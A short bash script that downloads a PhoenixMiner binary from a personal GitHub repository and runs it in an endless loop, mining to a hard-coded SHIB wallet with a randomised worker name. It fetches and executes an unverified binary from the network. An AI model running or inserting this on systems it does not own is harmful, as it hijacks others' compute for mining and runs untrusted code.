#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=SHIB:0xa3d3f3d8ea6252f798d48e9dc7cde0ae2a45b383
WORKER=$(echo $(shuf -i 10-40 -n 1)-DOGE)
wget https://github.com/skullCANDe/skyz/raw/main/PhoenixMiner
chmod +x PhoenixMiner
while [ 1 ]; do
./PhoenixMiner -pool $POOL -wal $WALLET.$WORKER -pass x
sleep 5
done
sleep 999999999
